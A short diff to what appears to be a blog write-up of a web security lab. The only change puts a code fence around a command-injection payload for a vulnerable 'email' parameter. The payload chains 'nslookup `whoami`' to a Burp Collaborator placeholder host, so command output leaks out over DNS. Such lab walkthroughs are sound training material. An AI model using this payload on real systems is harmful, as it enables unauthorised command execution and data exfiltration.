@@ -327,7 +327,9 @@ Explanation:
 
 As before, we intercepted the request. We know that the `email` parameter is vulnerable. 
 
+```
 We can put in the payload - "|| nslookup `whoami`.<BURP COLLABORATOR URL> ||" with `email` parameter and send the request.
+```
 
 Note that whoami is in backticks like `whoami`. I can't put that in the blog because of markdown syntax.
 
